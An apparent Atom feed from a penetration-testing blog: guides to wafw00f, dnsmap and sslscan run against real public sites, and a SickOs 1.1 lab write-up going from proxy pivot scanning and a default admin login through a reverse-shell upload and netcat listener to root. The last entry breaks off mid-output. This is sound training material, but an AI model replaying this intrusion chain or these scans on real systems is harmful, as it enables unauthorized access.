<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-06-30T05:13:30-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[wafw00f - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/30/wafw00f-kali-linux-tools/"/>
    <updated>2017-06-30T04:46:55-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/30/wafw00f-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you need to establish if a web application firewall is in place, and ideally, what type of WAF it is. You can go bark at it with wafw00f!</p>

<p>Homepage: <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>

<!-- more -->


<h2>wafw00f description</h2>

<blockquote><p>WAFW00F identifies and fingerprints Web Application Firewall (WAF) products.</p>

<p>How does it work?</p>

<p>To do its magic, WAFW00F does the following:</p>

<p> Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions</p>

<p> If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to
deduce which WAF it is</p>

<p> If that is also not successful, it analyses the responses previously returned and uses another simple algorithm
to guess if a WAF or security solution is actively responding to our attacks</p></blockquote>

<h2>wafw00f options</h2>

<p>```
wafw00f -h</p>

<pre><code>                             ^     ^
    _   __  _   ____ _   __  _    _   ____
   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
  | V V // o // _/ | V V // 0 // 0 // _/
  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
                            &lt;
                             ...'

WAFW00F - Web Application Firewall Detection Tool

By Sandro Gauci &amp;&amp; Wendel G. Henrique
</code></pre>

<p>Usage: wafw00f url1 [url2 [url3 &hellip; ]]
example: wafw00f <a href="http://www.victim.org/">http://www.victim.org/</a></p>

<p>Options:
  -h, &mdash;help            show this help message and exit
  -v, &mdash;verbose         enable verbosity &ndash; multiple -v options increase</p>

<pre><code>                    verbosity
</code></pre>

<p>  -a, &mdash;findall         Find all WAFs, do not stop testing on the first one
  -r, &mdash;disableredirect</p>

<pre><code>                    Do not follow redirections given by 3xx responses
</code></pre>

<p>  -t TEST, &mdash;test=TEST  Test for one specific WAF
  -l, &mdash;list            List all WAFs that we are able to detect
  &mdash;xmlrpc              Switch on the XML-RPC interface instead of CUI
  &mdash;xmlrpcport=XMLRPCPORT</p>

<pre><code>                    Specify an alternative port to listen on, default 8001
</code></pre>

<p>  -V, &mdash;version         Print out the version
```</p>

<h2>wafw00f usage</h2>

<ul>
<li>see what WAFs it can detect at the moment</li>
</ul>


<p>```
wafw00f -l</p>

<pre><code>                             ^     ^
    _   __  _   ____ _   __  _    _   ____
   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
  | V V // o // _/ | V V // 0 // 0 // _/
  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
                            &lt;
                             ...'

WAFW00F - Web Application Firewall Detection Tool

By Sandro Gauci &amp;&amp; Wendel G. Henrique
</code></pre>

<p>Can test for these WAFs:</p>

<p>Profense
NetContinuum
Incapsula WAF
CloudFlare
USP Secure Entry Server
Cisco ACE XML Gateway
Barracuda Application Firewall
Art of Defence HyperGuard
BinarySec
Teros WAF
F5 BIG-IP LTM
F5 BIG-IP APM
F5 BIG-IP ASM
F5 FirePass
F5 Trafficshield
InfoGuard Airlock
Citrix NetScaler
Trustwave ModSecurity
IBM Web Application Security
IBM DataPower
DenyALL WAF
Applicure dotDefender
Juniper WebApp Secure
Microsoft URLScan
Aqtronix WebKnight
eEye Digital Security SecureIIS
Imperva SecureSphere
Microsoft ISA Server
```</p>

<ul>
<li>detect WAF</li>
</ul>


<p>```
wafw00f <a href="https://bugcrowd.com">https://bugcrowd.com</a></p>

<pre><code>                             ^     ^
    _   __  _   ____ _   __  _    _   ____
   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
  | V V // o // _/ | V V // 0 // 0 // _/
  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
                            &lt;
                             ...'

WAFW00F - Web Application Firewall Detection Tool

By Sandro Gauci &amp;&amp; Wendel G. Henrique
</code></pre>

<p>Checking <a href="https://bugcrowd.com">https://bugcrowd.com</a>
The site <a href="https://bugcrowd.com">https://bugcrowd.com</a> is behind a CloudFlare
Number of requests: 1
```</p>

<ul>
<li>not detecting WAF</li>
</ul>


<p>```
wafw00f cisco.com</p>

<pre><code>                             ^     ^
    _   __  _   ____ _   __  _    _   ____
   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
  | V V // o // _/ | V V // 0 // 0 // _/
  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
                            &lt;
                             ...'

WAFW00F - Web Application Firewall Detection Tool

By Sandro Gauci &amp;&amp; Wendel G. Henrique
</code></pre>

<p>Checking <a href="http://cisco.com">http://cisco.com</a>
Generic Detection results:
No WAF detected by the generic detection
Number of requests: 13
```</p>

<ul>
<li>establish there is a WAF but without detecting its type</li>
</ul>


<p>```
wafw00f -a microsoft.com</p>

<pre><code>                             ^     ^
    _   __  _   ____ _   __  _    _   ____
   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
  | V V // o // _/ | V V // 0 // 0 // _/
  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
                            &lt;
                             ...'

WAFW00F - Web Application Firewall Detection Tool

By Sandro Gauci &amp;&amp; Wendel G. Henrique
</code></pre>

<p>Checking <a href="http://microsoft.com">http://microsoft.com</a>
Generic Detection results:
The site <a href="http://microsoft.com">http://microsoft.com</a> seems to be behind a WAF or some sort of security solution
Reason: The server returned a different response code when a string trigged the blacklist.
Normal response code is &ldquo;400&rdquo;, while the response code to an attack is &ldquo;301&rdquo;
Number of requests: 13
```</p>

<p>```</p>

<hr />

<p>/ You&rsquo;ll wish that you had done some of \
| the hard things when they were easier |
\ to do.                                /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SickOs 1.1 writeup]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup/"/>
    <updated>2017-06-28T08:09:14-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is similar to what can be found in OSCP labs. The goal is to obtain root privileges and get the flag. Let&rsquo;s dive right in!</p>

<!-- more -->


<h2>Recon</h2>

<p>Nmap results are:</p>

<p>```
nmap -T4 -p- -A 192.168.217.143</p>

<p>PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|<em>  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
| http-open-proxy: Potentially OPEN proxy.
|</em>Methods supported: GET HEAD
|<em>http-server-header: squid/3.1.19
|</em>http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
```</p>

<p>This is an interesting one, there are no obvious points of entry, but there is a Squid proxy in place. Navigating directly to port 3128 didn&rsquo;t yield anything besides an error of an invalid URL request. I googled the Squid version and found a potentially useful <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning">Metasploit module</a>:</p>

<blockquote><p>A misconfigured Squid proxy can allow an attacker to make requests on his behalf. This may give the attacker
information about devices that he cannot reach but the Squid proxy can. For example, an attacker can make requests
for internal IP addresses against a misconfigurated open Squid proxy exposed to the Internet, therefore performing an
internal port scan. The error messages returned by the proxy are used to determine if the port is open or not. Many
Squid proxies use custom error codes so your mileage may vary. The open_proxy module can be used to test for open
proxies, though a Squid proxy does not have to be open in order to allow for pivoting (e.g. an Intranet Squid proxy
which allows the attack to pivot to another part of the network).</p></blockquote>

<p>Here are the options I&rsquo;ve used for the scanner:</p>

<p>```
msf auxiliary(squid_pivot_scanning) > options</p>

<p>Module options (auxiliary/scanner/http/squid_pivot_scanning):</p>

<p>   Name          Current Setting                                  Required  Description</p>

<hr />

<p>   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RANGE         192.168.217.143                                  yes       IPs to scan through Squid proxy
   RHOSTS        192.168.217.143                                  yes       The target address range or CIDR identifier
   RPORT         3128                                             yes       The target port (TCP)
   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
   THREADS       1                                                yes       The number of concurrent threads
   VHOST                                                          no        HTTP server virtual host
```</p>

<p>And the output:</p>

<p>```
msf auxiliary(squid_pivot_scanning) > run</p>

<p>[+] [192.168.217.143] 192.168.217.143 is alive but 21 is CLOSED
[+] [192.168.217.143] 192.168.217.143:80 seems OPEN
[+] [192.168.217.143] 192.168.217.143 is alive but 139 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 445 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 1433 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 1521 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 1723 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 3389 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 8080 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 9100 is CLOSED
[<em>] Scanned 1 of 1 hosts (100% complete)
[</em>] Auxiliary module execution completed
```</p>

<p>It appears port 80 is open on the target. I configured my browser to use the Squid proxy and went to the web server:</p>

<p><img class="center" src="/images/pentest/sickos/1-web.png" title="&lsquo;web server&rsquo; &lsquo;webpage&rsquo;" ></p>

<p>If it doesn&rsquo;t appear there is much content on the web server, we have to get more information by force _;) Since I had to take the proxy into consideration, I preferred a CLI tool rather than a GUI like Dirbuster. How fortunate that there is a CLI companion to Dirbuster, called <em>sound of drums</em>: <strong>dirb</strong>!</p>

<h3>dirb description</h3>

<p>Homepage: <a href="http://dirb.sourceforge.net/">http://dirb.sourceforge.net/</a></p>

<blockquote><p>DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web
Objects. It basically works by launching a dictionary based attack against
a web server and analizing the response.</p>

<p>DIRB comes with a set of preconfigured attack wordlists for easy usage but
you can use your custom wordlists. Also DIRB sometimes can be used as a
classic CGI scanner, but remember is a content scanner not a vulnerability scanner.</p>

<p>DIRB main purpose is to help in professional web application auditing.
Specially in security related testing. It covers some holes not covered by
classic web vulnerability scanners. DIRB looks for specific web objects that
other generic CGI scanners can&rsquo;t look for. It doesn&rsquo;t search vulnerabilities
nor does it look for web contents that can be vulnerables.</p></blockquote>

<h3>dirb options</h3>

<h2>``` </h2>

<p>DIRB v2.22</p>

<h2>By The Dark Raver</h2>

<p>./dirb &lt;url_base> [&lt;wordlist_file(s)>] [options]</p>

<p>========================= NOTES =========================
 &lt;url_base> : Base URL to scan. (Use -resume for session resuming)
 &lt;wordlist_file(s)> : List of wordfiles. (wordfile1,wordfile2,wordfile3&hellip;)</p>

<p>======================== HOTKEYS ========================
 &lsquo;n&rsquo; &ndash;> Go to next directory.
 &lsquo;q&rsquo; &ndash;> Stop scan. (Saving state for resume)
 &lsquo;r&rsquo; &ndash;> Remaining scan stats.</p>

<p>======================== OPTIONS ========================
 -a &lt;agent_string> : Specify your custom USER_AGENT.
 -c &lt;cookie_string> : Set a cookie for the HTTP request.
 -f : Fine tunning of NOT_FOUND (404) detection.
 -H &lt;header_string> : Add a custom header to the HTTP request.
 -i : Use case-insensitive search.
 -l : Print &ldquo;Location&rdquo; header when found.
 -N &lt;nf_code>: Ignore responses with this HTTP code.
 -o &lt;output_file> : Save output to disk.
 -p &lt;proxy[:port]> : Use this proxy. (Default port is 1080)
 -P &lt;proxy_username:proxy_password> : Proxy Authentication.
 -r : Don&rsquo;t search recursively.
 -R : Interactive recursion. (Asks for each directory)
 -S : Silent Mode. Don&rsquo;t show tested words. (For dumb terminals)
 -t : Don&rsquo;t force an ending &lsquo;/&rsquo; on URLs.
 -u &lt;username:password> : HTTP Authentication.
 -v : Show also NOT_FOUND pages.
 -w : Don&rsquo;t stop on WARNING messages.
 -X <extensions> / -x &lt;exts_file> : Append each word with this extensions.
 -z <milisecs> : Add a miliseconds delay to not cause excessive Flood.</p>

<p>======================== EXAMPLES =======================
 ./dirb <a href="http://url/directory/">http://url/directory/</a> (Simple Test)
 ./dirb <a href="http://url/">http://url/</a> -X .html (Test files with &lsquo;.html&rsquo; extension)
 ./dirb <a href="http://url/">http://url/</a> /usr/share/dirb/wordlists/vulns/apache.txt (Test with apache.txt wordlist)
 ./dirb <a href="https://secure_url/">https://secure_url/</a> (Simple Test with SSL)
```</p>

<p>This tool is exactly what I needed! And it finished really fast! Here are its discoveries:</p>

<p>```
dirb <a href="http://192.168.217.143">http://192.168.217.143</a> /usr/share/wordlists/dirb/common.txt -p 192.168.217.143:3128</p>

<hr />

<p>DIRB v2.22</p>

<h2>By The Dark Raver</h2>

<p>START_TIME: Thu Jun 29 06:45:12 2017
URL_BASE: <a href="http://192.168.217.143/">http://192.168.217.143/</a>
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
PROXY: 192.168.217.143:3128</p>

<hr />

<p>GENERATED WORDS: 4612</p>

<p>&mdash;&mdash; Scanning URL: <a href="http://192.168.217.143/">http://192.168.217.143/</a> &mdash;&mdash;
+ <a href="http://192.168.217.143/cgi-bin/">http://192.168.217.143/cgi-bin/</a> (CODE:403|SIZE:291)                                                                                             <br/>
+ <a href="http://192.168.217.143/connect">http://192.168.217.143/connect</a> (CODE:200|SIZE:109)                                                                                              <br/>
+ <a href="http://192.168.217.143/index">http://192.168.217.143/index</a> (CODE:200|SIZE:21)                                                                                                 <br/>
+ <a href="http://192.168.217.143/index.php">http://192.168.217.143/index.php</a> (CODE:200|SIZE:21)                                                                                             <br/>
+ <a href="http://192.168.217.143/robots">http://192.168.217.143/robots</a> (CODE:200|SIZE:45)                                                                                                <br/>
+ <a href="http://192.168.217.143/robots.txt">http://192.168.217.143/robots.txt</a> (CODE:200|SIZE:45)                                                                                            <br/>
+ <a href="http://192.168.217.143/server-status">http://192.168.217.143/server-status</a> (CODE:403|SIZE:296)</p>

<hr />

<p>END_TIME: Thu Jun 29 06:45:16 2017
DOWNLOADED: 4612 &ndash; FOUND: 7
```</p>

<p>Quite interesting. Some resources are forbidden, connect is a Python script with the following content:</p>

<p>```</p>

<h1>!/usr/bin/python</h1>

<p>print &ldquo;I Try to connect things very frequently\n&rdquo;
print &ldquo;You may want to try my services&rdquo;
```</p>

<p>The robots.txt file seems the most useful:</p>

<p><code>
User-agent: *
Disallow: /
Dissalow: /wolfcms
</code></p>

<p>A hidden CMS, eh? I went there to find this:</p>

<p><img class="center" src="/images/pentest/sickos/1-wolfcms.png" title="&lsquo;wolfcms&rsquo; &lsquo;wolfcms&rsquo;" ></p>

<p>I ran Nikto on it, didn&rsquo;t find anything interesting besides an outdated Apache version. Same with other scanners and another round of directory bruteforcing, nothing useful. I googled for WolfCMS, and found an arbitrary file upload exploit, but it required an authenticated user. So next I searched for the admin interface, and found an answer on <a href="https://www.wolfcms.org/forum/topic2034.html">their forums</a>. So I appended <em>?admin</em> to the path and got redirected to <a href="http://192.168.217.143/wolfcms/?/admin/login">http://192.168.217.143/wolfcms/?/admin/login</a></p>

<p><img class="center" src="/images/pentest/sickos/1-login.png" title="&lsquo;wolfcms admin&rsquo; &lsquo;wolfcms admin login&rsquo;" ></p>

<p>I couldn&rsquo;t find default credentials, no obvious SQL errors, so I tried a few common combinations, and imagine the surprise when <em>admin:admin</em> worked!</p>

<p><img class="center" src="/images/pentest/sickos/1-admin.png" title="&lsquo;admin&rsquo; &lsquo;wolfcms admin panel&rsquo;" ></p>

<h2>Exploitation</h2>

<p>Now I can use the <a href="https://www.exploit-db.com/exploits/36818/">exploit</a>. The vulnerability exists in the CMS' File Manager, which doesn&rsquo;t restrict the types of files that can be uploaded. But I forgot that I had to access the CMS through a proxy, and didn&rsquo;t want to modify the code, so instead I manually uploaded Pentestmonkey&rsquo;s reverse shell through the interface:</p>

<p><img class="center" src="/images/pentest/sickos/1-file.png" title="&lsquo;file manager&rsquo; &lsquo;wolfcms file upload&rsquo;" ></p>

<p>I set up a Netcat listener and navigated to the shell:</p>

<p><code>
root@kali:~# nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 33709
Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 18:12:38 up  3:14,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
</code></p>

<p>I looked inside the web directory and found a <strong>config.php</strong> file in <code>/var/www/wolfcms</code> that contained a set of credentials:</p>

<p><code>
// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
</code></p>

<p>I also noted the existence of a sickos user, based on the home directories. Tried SSH'ing as root, no joy. But trying as sickos with the above password worked! Inside sickos' home, I noticed a bash_history file:</p>

<p><code>
sickos@SickOs:~$ cat .bash_history
sudo su
exit
</code></p>

<p>Woot, could it be that easy? I did a <code>sudo -l</code>:</p>

<p>```
User sickos may run the following commands on this host:</p>

<pre><code>(ALL : ALL) ALL
</code></pre>

<p>```</p>

<p>Root was only a <em>sudo su</em> away!</p>

<p><code>
root@SickOs:~# whoami
root
</code></p>

<p>And the flag:</p>

<p>```
root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!</p>

<p>ROOT!</p>

<p>You have Succesfully completed SickOS1.1.
Thanks for Trying
```</p>

<p>Thanks D4rk for an interesting machine, with a nice twist of Squid!</p>

<p>```</p>

<hr />

<p>&lt; You will outgrow your usefulness. ></p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dnsmap - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/27/dnsmap-kali-linux-tools/"/>
    <updated>2017-06-27T04:12:46-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/27/dnsmap-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll explore another tool for DNS enumeration: the DNS Network Mapper (dnsmap). Although at the time of this post, its last update was in 2010, this tool has survived the passage of time, and has been packaged with versions of both Backtrack and Kali. There is quite a wealth of information about the tool on its homepage, and it comes with a built-in wordlist for domain bruteforcing.</p>

<p>Homepage: <a href="https://github.com/makefu/dnsmap">https://github.com/makefu/dnsmap</a></p>

<!-- more -->


<h2>dnsmap description</h2>

<blockquote><p>dnsmap was originally released back in 2006 and was inspired by the
fictional story &ldquo;The Thief No One Saw&rdquo; by Paul Craig, which can be found
in the book &ldquo;Stealing the Network &ndash; How to 0wn the Box&rdquo;</p>

<p>dnsmap is mainly meant to be used by pentesters during the information
gathering/enumeration phase of infrastructure security assessments. During the
enumeration stage, the security consultant would typically discover the target
company&rsquo;s IP netblocks, domain names, phone numbers, etc &hellip;</p>

<p>Subdomain brute-forcing is another technique that should be used in the
enumeration stage, as it&rsquo;s especially useful when other domain enumeration
techniques such as zone transfers don&rsquo;t work (I rarely see zone transfers
being <em>publicly</em> allowed these days by the way).</p>

<p>LIMITATIONS</p>

<p>Lack of multi-threading. This speed issue will hopefully be resolved in future versions.</p>

<p>FUN THINGS THAT CAN HAPPEN</p>

<ol>
<li><p>Finding interesting remote access servers (e.g.: <a href="https://extranet.targetdomain.com">https://extranet.targetdomain.com</a>)</p></li>
<li><p>Finding badly configured and/or unpatched servers (e.g.: test.targetdomain.com)</p></li>
<li><p>Finding new domain names which will allow you to map non-obvious/hard-to-find netblocks
of your target organization (registry lookups &ndash; aka whois is your friend)</p></li>
<li><p>Sometimes you find that some bruteforced subdomains resolve to internal IP addresses
(RFC 1918). This is great as sometimes they are real up-to-date &ldquo;A&rdquo; records which means
that it <em>is</em> possible to enumerate internal servers of a target organization from the
Internet by only using standard DNS resolving (as oppossed to zone transfers for instance).</p></li>
<li><p>Discover embedded devices configured using Dynamic DNS services (e.g.: linksys-cam.com).
This method is an alternative to finding devices via Google hacking techniques</p></li>
</ol>


<p>USAGE</p>

<p>Bruteforcing can be done either with dnsmap&rsquo;s built-in wordlist or a user-supplied wordlist.
Results can be saved in CSV and human-readable format for further processing. dnsmap does
NOT require root privileges to be run, and should NOT be run with such privileges for security reasons.</p></blockquote>

<h2>dnsmap options</h2>

<p>```
dnsmap 0.30 &ndash; DNS Network Mapper by pagvac (gnucitizen.org)</p>

<p>usage: dnsmap &lt;target-domain> [options]
options:
-w &lt;wordlist-file>
-r &lt;regular-results-file>
-c &lt;csv-results-file>
-d &lt;delay-millisecs>
-i &lt;ips-to-ignore> (useful if you&rsquo;re obtaining false positives)</p>

<p>e.g.:
dnsmap target-domain.foo
dnsmap target-domain.foo -w yourwordlist.txt -r /tmp/domainbf_results.txt
dnsmap target-fomain.foo -r /tmp/ -d 3000
dnsmap target-fomain.foo -r ./domainbf_results.txt
```</p>

<h2>dnsmap usage</h2>

<p>```
dnsmap slack.com
dnsmap 0.30 &ndash; DNS Network Mapper by pagvac (gnucitizen.org)</p>

<p>[+] warning: domain might use wildcards. 54.230.203.126 will be ignored from results
[+] searching (sub)domains for slack.com using built-in wordlist
[+] using maximum random delay of 10 millisecond(s) between requests</p>

<p>email.slack.com
IP address #1: 34.196.74.192
IP address #2: 54.88.163.82</p>

<p>files.slack.com
IP address #1: 52.85.178.60</p>

<p>qa.slack.com
IP address #1: 54.192.201.191</p>

<p>staging.slack.com
IP address #1: 52.87.251.252</p>

<p>upload.slack.com
IP address #1: 34.197.50.42
IP address #2: 52.22.100.1
IP address #3: 52.44.55.102
IP address #4: 52.54.239.215</p>

<p>[+] 5 (sub)domains and 9 IP address(es) found
[+] completion time: 122 second(s)
```</p>

<p>Here is how the output looks in the CSV format:</p>

<p><img class="center" src="/images/tools/dnsmap.png" title="&lsquo;dnsmap&rsquo; &lsquo;dnsmap CSV report&rsquo;" ></p>

<p>```</p>

<hr />

<p>/ In the stairway of life, you&rsquo;d best \
\ take the elevator.                  /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sslscan - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/24/sslscan-kali-linux-tools/"/>
    <updated>2017-06-24T07:36:03-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/24/sslscan-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to assess the SSL security posture of a target by listing the supported cipher suites. sslscan is a fast SSL/TLS scanner that has been extended from its original version, and at the time of this post, its last update was 2 days ago.</p>

<p>Homepage: <a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a></p>

<!-- more -->


<h2>sslscan description</h2>

<blockquote><p>sslscan  queries SSL/TLS services, such as HTTPS, in order to determine the ciphers that are supported.</p>

<p>SSLScan is designed to be easy, lean and fast. The output includes preferred  ciphers of the SSL/TLS service, and
text and XML output formats are supported. It is TLS SNI aware when used with a  supported  version of OpenSSL.</p>

<p>Output is colour coded to indicate security issues. Colours are as follows:</p>

<p>Red Background:  NULL cipher (no encryption)</p>

<p>Red:             Broken cipher (&lt;= 40 bit), broken  protocol  (SSLv2  or SSLv3) or broken certificate signing
algorithm (MD5)</p>

<p>Yellow:           Weak  cipher  (&lt;=  56  bit or RC4) or weak certificate signing algorithm (SHA-1)</p>

<p>Purple:          Anonymous cipher (ADH or AECDH)</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/xenial/man1/sslscan.1.html">http://manpages.ubuntu.com/manpages/xenial/man1/sslscan.1.html</a></p>

<h2>sslscan options</h2>

<p>```</p>

<pre><code>       ___ ___| |___  ___ __ _ _ __
      / __/ __| / __|/ __/ _` | '_ \
      \__ \__ \ \__ \ (_| (_| | | | |
      |___/___/_|___/\___\__,_|_| |_|


    1.11.10-static
    OpenSSL 1.0.2-chacha (1.0.2g-dev)
</code></pre>

<p>Command:
  sslscan [Options] [host:port | host]</p>

<p>Options:
  &mdash;targets=<file>     A file containing a list of hosts to check.</p>

<pre><code>                   Hosts can  be supplied  with ports (host:port)
</code></pre>

<p>  &mdash;sni-name=<name>    Hostname for SNI
  &mdash;ipv4               Only use IPv4
  &mdash;ipv6               Only use IPv6
  &mdash;show-certificate   Show full certificate information
  &mdash;no-check-certificate  Don&rsquo;t warn about weak certificate algorithm or keys
  &mdash;show-client-cas    Show trusted CAs for TLS client auth
  &mdash;show-ciphers       Show supported client ciphers
  &mdash;show-cipher-ids    Show cipher ids
  &mdash;show-times         Show handhake times in milliseconds
  &mdash;ssl2               Only check SSLv2 ciphers
  &mdash;ssl3               Only check SSLv3 ciphers
  &mdash;tls10              Only check TLSv1.0 ciphers
  &mdash;tls11              Only check TLSv1.1 ciphers
  &mdash;tls12              Only check TLSv1.2 ciphers
  &mdash;tlsall             Only check TLS ciphers (all versions)
  &mdash;ocsp               Request OCSP response from server
  &mdash;pk=<file>          A file containing the private key or a PKCS#12 file</p>

<pre><code>                   containing a private key/certificate pair
</code></pre>

<p>  &mdash;pkpass=<password>  The password for the private  key or PKCS#12 file
  &mdash;certs=<file>       A file containing PEM/ASN1 formatted client certificates
  &mdash;no-ciphersuites    Do not check for supported ciphersuites
  &mdash;no-fallback        Do not check for TLS Fallback SCSV
  &mdash;no-renegotiation   Do not check for TLS renegotiation
  &mdash;no-compression     Do not check for TLS compression (CRIME)
  &mdash;no-heartbleed      Do not check for OpenSSL Heartbleed (CVE-2014-0160)
  &mdash;starttls-ftp       STARTTLS setup for FTP
  &mdash;starttls-imap      STARTTLS setup for IMAP
  &mdash;starttls-irc       STARTTLS setup for IRC
  &mdash;starttls-ldap      STARTTLS setup for LDAP
  &mdash;starttls-pop3      STARTTLS setup for POP3
  &mdash;starttls-smtp      STARTTLS setup for SMTP
  &mdash;starttls-mysql     STARTTLS setup for MYSQL
  &mdash;starttls-xmpp      STARTTLS setup for XMPP
  &mdash;starttls-psql      STARTTLS setup for PostgreSQL
  &mdash;xmpp-server        Use a server-to-server XMPP handshake
  &mdash;http               Test a HTTP connection
  &mdash;rdp                Send RDP preamble before starting scan
  &mdash;bugs               Enable SSL implementation bug work-arounds
  &mdash;timeout=<sec>      Set socket timeout. Default is 3s
  &mdash;sleep=<msec>       Pause between connection request. Default is disabled
  &mdash;xml=<file>         Output results to an XML file</p>

<pre><code>                   &lt;file&gt; can be -, which means stdout
</code></pre>

<p>  &mdash;version            Display the program version
  &mdash;verbose            Display verbose output
  &mdash;no-cipher-details  Disable EC curve names and EDH/RSA key lengths output
  &mdash;no-colour          Disable coloured output
  &mdash;help               Display the  help text  you are  now reading</p>

<p>Example:
  sslscan 127.0.0.1
  sslscan [::1]
```</p>

<h2>sslscan usage</h2>

<p>```
sslscan <a href="https://www.cylance.com">https://www.cylance.com</a>
Version: 1.11.10-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)</p>

<p>Testing SSL server www.cylance.com on port 443 using SNI name www.cylance.com</p>

<p>  TLS Fallback SCSV:
Server supports TLS Fallback SCSV</p>

<p>  TLS renegotiation:
Secure session renegotiation supported</p>

<p>  TLS Compression:
Compression disabled</p>

<p>  Heartbleed:
TLS 1.2 not vulnerable to heartbleed
TLS 1.1 not vulnerable to heartbleed
TLS 1.0 not vulnerable to heartbleed</p>

<p>  Supported Server Cipher(s):
Preferred TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256          <br/>
Accepted  TLSv1.2  128 bits  AES128-SHA256              <br/>
Accepted  TLSv1.2  128 bits  AES128-SHA                 <br/>
Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384          <br/>
Accepted  TLSv1.2  256 bits  AES256-SHA256              <br/>
Accepted  TLSv1.2  256 bits  AES256-SHA                 <br/>
